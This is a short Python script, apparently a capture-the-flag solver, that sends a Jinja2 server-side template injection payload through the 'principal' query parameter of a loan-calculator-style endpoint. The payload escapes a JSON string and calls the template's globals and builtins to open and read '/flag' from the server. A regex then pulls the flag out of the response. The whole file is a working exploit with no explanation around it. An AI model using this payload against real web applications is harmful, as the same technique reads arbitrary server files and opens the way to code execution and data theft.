# coding:utf-8
import requests
import re
import sys


def Scan(url):
    flag = ""
    try:
        # 构造 payload
        payload = 'a","flag":"{{ self.__init__.__globals__.__builtins__.open(\'/flag\').read() }}"'
        params = {"payment": "1", "term": "1", "principal": payload}
        # 发送 GET 请求
        resp = requests.get(url, params=params, timeout=10)
        # 匹配 flag 格式
        match = re.search(r"(flag\{[^\}]+\}|FLAG\{[^\}]+\})", resp.text)
        if match:
            flag = match.group(1)
    except Exception as e:
        print(e)
    return flag


if __name__ == "__main__":
    print(Scan(url=sys.argv[1]))
